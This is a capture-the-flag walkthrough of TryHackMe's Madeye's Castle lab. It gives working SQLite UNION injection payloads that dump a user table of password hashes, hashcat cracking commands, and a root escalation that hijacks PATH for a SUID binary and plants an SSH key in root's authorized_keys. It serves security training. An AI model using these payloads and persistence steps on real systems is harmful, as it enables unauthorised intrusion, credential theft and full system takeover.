# 63 - Madeye's Castle (sqlite injection)

Room Link --> [https://tryhackme.com/room/madeyescastle](https://tryhackme.com/room/madeyescastle)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.165.97 -p- -T4 -T5 -sV

PORT    STATE    SERVICE     REASON      VERSION
22/tcp  open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open http        no-response
139/tcp open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```
{% endcode %}

On the Main Web page sourcecode, we see a domain name:

```
hogwartz-castle.thm
```

<figure><img src=".gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

#### SMBMAP enum

{% code lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ smbmap -H hogwartz-castle.thm -u 'anonymous' -p 'anonymous

[+] IP: 10.10.165.97:445	Name: hogwartz-castle.thm 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Harry's Important Files
	IPC$                                              	NO ACCESS	IPC Service (hogwartz-castle server (Samba, Ubuntu))
```
{% endcode %}

Accessed the share with `smbclient` and there were 2 files in there:

<pre class="language-bash"><code class="lang-bash">┌──(dking㉿dking)-[~/Downloads]
└─$ smbclient //hogwartz-castle.thm/sambashare

spellnames.txt                      N      874  Thu Nov 26 02:06:32 2020
.notes.txt                          H      147  Thu Nov 26 02:19:19 2020

# outputs
<strong>┌──(dking㉿dking)-[~/Downloads]
</strong>└─$ cat .notes.txt 
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
</code></pre>

#### Enum4linux enum

We got 2 users : `harry : hermonine` .

<figure><img src=".gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

Navigating to `http://hogwartz-castle.thm/` .

<figure><img src=".gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

So i tried sql injection attacks.

So i decided to use an sqli\_payload list to bruteforce the admin input box for possible sql injection indication using burpsuite.

<figure><img src=".gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

So with payload `'OR '1` - we got a user: `Lucas Washington` .

This generic payload also gives same result: `' OR 1=1 -- -` .

#### Number of Columns

When i use 5 i get an error

<figure><img src=".gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

But 4 gives 200 statuscode.

<figure><img src=".gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

We have 4 columns here.

<figure><img src=".gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

But determining what DB this is, i tried dumping versions for all the DBs (MySQL, Postgresql, Orace, SQLITE) but SQLITE worked.&#x20;

```sql
# sql version
user=' UNION SELECT 1,2,3,sqlite_master -- -
```

&#x20;`version 3.22.0` .

<figure><img src=".gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

We are dealing with sqlite db.

#### Getting Tables

```sql
# tables
' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master -- -

# table name
users
```

<figure><img src=".gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

#### Getting Columns

{% code overflow="wrap" %}
```sql
# columns in users table
' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE tbl_name='users' -- -

# column names
name
password
admin
notes
```
{% endcode %}

<figure><img src=".gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

#### Dumping all data.

{% code overflow="wrap" lineNumbers="true" %}
```sql
' UNION SELECT 1,2,3,group_concat(name||"<-->"||password||"<-->"||admin||"<-->"||notes) FROM users -- -
```
{% endcode %}

```
Lucas Washington<-->c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492<-->contact administrator. Congrats on SQL injection... keep digging,
Harry Turner<-->b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885<-->My linux username is my first name, and password uses best64,
Andrea Phillips<-->e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54<--> contact administrator. Congrats on SQL injection... keep digging,
Liam Hernandez<-->5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d<-->contact administrator. Congrats on SQL injection... keep digging,
Adam Jenkins<-->2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b<-->contact administrator. Congrats on SQL injection... keep digging,
Landon Alexander<-->79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905<-->contact administrator. Congrats on SQL injection... keep digging,
Kennedy Anderson<-->e3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22e<--> contact administrator. Congrats on SQL injection... keep digging,
Sydney Wright<-->d3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744<--> contact administrator. Congrats on SQL injection... keep digging,
Aaliyah Sanders<-->dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0<--> contact administrator. Congrats on SQL injection... keep digging,
Olivia Murphy<-->6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918<--> contact administrator. Congrats on SQL injection... keep digging,
Olivia Ross<-->93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04d<--> contact administrator. Congrats on SQL injection... keep digging,
Grace Brooks<-->9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6d<--> contact administrator. Congrats on SQL injection... keep digging,
Jordan White<-->5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8b<-->contact administrator. Congrats on SQL injection... keep digging,
Diego Baker<-->87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aad<-->contact administrator. Congrats on SQL injection... keep digging,
Liam Ward<-->88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7<-->contact administrator. Congrats on SQL injection... keep digging,
Carlos Barnes<-->7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77e<-->contact administrator. Congrats on SQL injection... keep digging,
Carlos Lopez<-->8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671<-->contact administrator. Congrats on SQL injection... keep digging,
Oliver Gonzalez<-->c809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4e<-->contact administrator. Congrats on SQL injection... keep digging,
Sophie Sanchez<-->68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9b<--> contact administrator. Congrats on SQL injection... keep digging,
Maya Sanders<-->7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66<--> contact administrator. Congrats on SQL injection... keep digging,
Joshua Reed<-->e49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124<-->contact administrator. Congrats on SQL injection... keep digging,
Aaliyah Allen<-->c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab<--> contact administrator. Congrats on SQL injection... keep digging,
Jasmine King<-->487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6<--> contact administrator. Congrats on SQL injection... keep digging,
Jonathan Long<-->44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798<-->contact administrator. Congrats on SQL injection... keep digging,
Samuel Anderson<-->a86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81df<-->contact administrator. Congrats on SQL injection... keep digging,
Julian Robinson<-->a1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9<-->contact administrator. Congrats on SQL injection... keep digging,
Gianna Harris<-->01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0<--> contact administrator. Congrats on SQL injection... keep digging,
Madelyn Morgan<-->d17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953<--> contact administrator. Congrats on SQL injection... keep digging,
Ella Garcia<-->ac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2<--> contact administrator. Congrats on SQL injection... keep digging,
Zoey Gonzales<-->134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb<--> contact administrator. Congrats on SQL injection... keep digging,
Abigail Morgan<-->afcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802<--> contact administrator. Congrats on SQL injection... keep digging,
Joseph Rivera<-->6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29<-->contact administrator. Congrats on SQL injection... keep digging,
Elizabeth Cook<-->af9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddb<--> contact administrator. Congrats on SQL injection... keep digging,
Parker Cox<-->53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0d<-->contact administrator. Congrats on SQL injection... keep digging,
Savannah Torres<-->11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490<--> contact administrator. Congrats on SQL injection... keep digging,
Aaliyah Williams<-->9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760<--> contact administrator. Congrats on SQL injection... keep digging,
Blake Washington<-->4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10e<-->contact administrator. Congrats on SQL injection... keep digging,
Claire Miller<-->d4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24<--> contact administrator. Congrats on SQL injection... keep digging,
Brody Stewart<-->36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36<-->contact administrator. Congrats on SQL injection... keep digging,
Kimberly Murphy<-->8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6<--> contact administrator. Congrats on SQL injection... keep digging
```

<figure><img src=".gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

Running one of the hash via haiti, we see they are SHA-512 hashes. I tried cracking then using the rockyou wordlist but it didn’t work. But we also found some notes on the database

{% code overflow="wrap" %}
```
Harry Turner<-->b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885<-->My linux username is my first name, and password uses best64,
```
{% endcode %}

One of the notes talked about a password using best64. Going back to our initial recon we remember that we had a bunch of spellnames. I tried to see of it had any base64 strings in it but it turned out to be a dead end. Then i remembered that hashcat has a rules file called best64

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*wxhcRS-gR2gRh4xnFZUXbQ.png" alt="" height="182" width="700"><figcaption></figcaption></figure>

I tried mutating the spellname text file using the best64 rule set and created an entirely new wordlist . I used the command

{% code overflow="wrap" lineNumbers="true" %}
```bash
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt > possible_passwords.txt

# cracking
hashcat passwd.txt possible_passwords.txt -m 1700
```
{% endcode %}

or we could just apply the ruleset on the cmd

{% code overflow="wrap" %}
```bash
# copy the hashes alone to a file.
# hashes is the hasf file, spellnames is the wordlist.
hashcat --force -m 1700 hashes2.txt spellnames.txt -r /usr/share/doc/hashcat/rules/best64.rule
```
{% endcode %}

### Initial Access

We were told the linux username was the first name of the user so the credentials are&#x20;

`harry` / `wingardiumleviosa123`

We ssh into the machine.

<figure><img src=".gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Hermonine

`sudo -l`  - we can run pico as user Hermonine.

Check gtfobin for exploit.

<figure><img src=".gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

`find / -user root -perm -4000 2>/dev/null`&#x20;

There is a Binary : `/srv/time-turner/swagger` .

I tried executing the binary and i was asked to guess a number but every time i guessed a number i got it wrong

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*fk6EIJWlM4JhvVp3uRhUAA.png" alt="" height="143" width="700"><figcaption></figcaption></figure>

I downloaded the SUID binary to my box and opened it up using ghidra which is a NSA reverse engineering tool

Looking at the decompiled output we see that the binary uses rand() function which generates random numbers as we have seen above.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*Ycbfcbh4zjV_WhfA9VqJ9g.png" alt="" height="408" width="700"><figcaption></figcaption></figure>

Doing some google researching i found that the rand function is vulnerable of some sort of time attack where if the time different is negligible the random number doesn’t change. So if we could find a way to run the command and cause the binary to leak the correct random number and we input the same leaked number to the binary before a significant amount of time passes we could potentially bypass the check. To prove this i executed the script 5 times in a for loop

using the command

```
for  number in $(seq 1 5);do echo 0 | /srv/time-turner/swagger; done
```

<figure><img src=".gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

Looking at the screenshot above the binary used the same digit 5 times five times it ran the binary meaning the the rand() function is not as random as it thinks

So the binary creates a random number then compares our input to the random number created and if they are similar meaning the condition is True the script executes another function called impressive.

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*qm6QRe3cZV0_Vn6kdEi9Zw.png" alt="" height="393" width="700"><figcaption></figcaption></figure>

The impressive function performs a system call to uname but as you can in the screenshot above it doesn’t use full PATH and since the binary is a SUID binary we could manipulate the PATH since it doesn’t uses secure PATH

```bash
# create a fake uname binary.
echo 'cat /root/root.txt' > /tmp/uname
chmod 777 /tmp/uname
export PATH=/tmp:$PATH
```

Next i used a one liner bash command which sends a wrong number the first time, gets the leaked random number then send it before the number expires.

Here’s the command:

{% code overflow="wrap" %}
```bash
/srv/time-turner/swagger | grep -oE '[^ ]+$' |tail -1 | /srv/time-turner/swagger

# or
echo 0 | /srv/time-turner/swagger | awk '{print $5}' | tail -1 | /srv/time-turner/swagger
```
{% endcode %}

<figure><img src=".gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

Note: spawning a shell directly didn't work but it's possible to write a SSH key to the root dir or do something more clever/uselful.

{% code overflow="wrap" %}
```bash
# 1st create the .ssh dir in the /root dir
hermonine@hogwartz-castle:/srv/time-turner$ echo 'mkdir /root/.ssh' > /tmp/uname
hermonine@hogwartz-castle:/srv/time-turner$ echo 0 | ./swagger | awk '{print $5}' | tail -1 | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is mkdir: cannot create directory ‘/root/.ssh’: File exists
```
{% endcode %}

We get a file exists, meaning successful.

{% code overflow="wrap" %}
```bash
# 2nd we add our kali pub key into the authorized_keys file.
hermonine@hogwartz-castle:/srv/time-turner$ echo 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIWpxBHS7uyopm7/TjbKFs+25m77Zj+aHa/SyjynovDiwwR7h65vsxb/0gGeqJ+IjE6q0AVGYTXlZC57VJb8phsoHjapYV3XEGzu8Gmjof2mfreOfnPUAgyv+BIHfnda1M7gFgxG4PUsWadGeMF9AtIxpqRia5G64f/5EaN2efMz+gyneKBR5moPJR6MSTAb+o9Mgx+C/W3N9Ic/GDWW1ei9/SONXEuLzMsJmlYVHunat85YAVT5k9+fW36gWp9zSr+E+PZNb4oo7ZZBsMOxbYs2aWl20vjpmj6C/XI+OKYwBJT6pXpgL806QI99tny6hD0FKPOxUB7sWOIXYbjEDQyGCzRHHE+cZio24UEWoFU+ytFouiBhlMUIIxjc9RqNWYMWV3fLYn51voZC14nSIiQ4p6m5Dwp4GFtlh9tflV1CE3MtiUNWhYIn6lQqACSJqCGNorUbt9zQG4BxOvhgubRd92lB84ZT1hhUFiG3IcjrJOrctBBUnA3NH/xyUMb8M= dking@dking > /root/.ssh/authorized_keys' > /tmp/uname

hermonine@hogwartz-castle:/srv/time-turner$ echo 0 | ./swagger | awk '{print $5}' | tail -1 | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is hermonine@hogwartz-castle:/srv/time-turner$
```
{% endcode %}

Done, now we can ssh as root using our private key.

<figure><img src=".gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

Done!

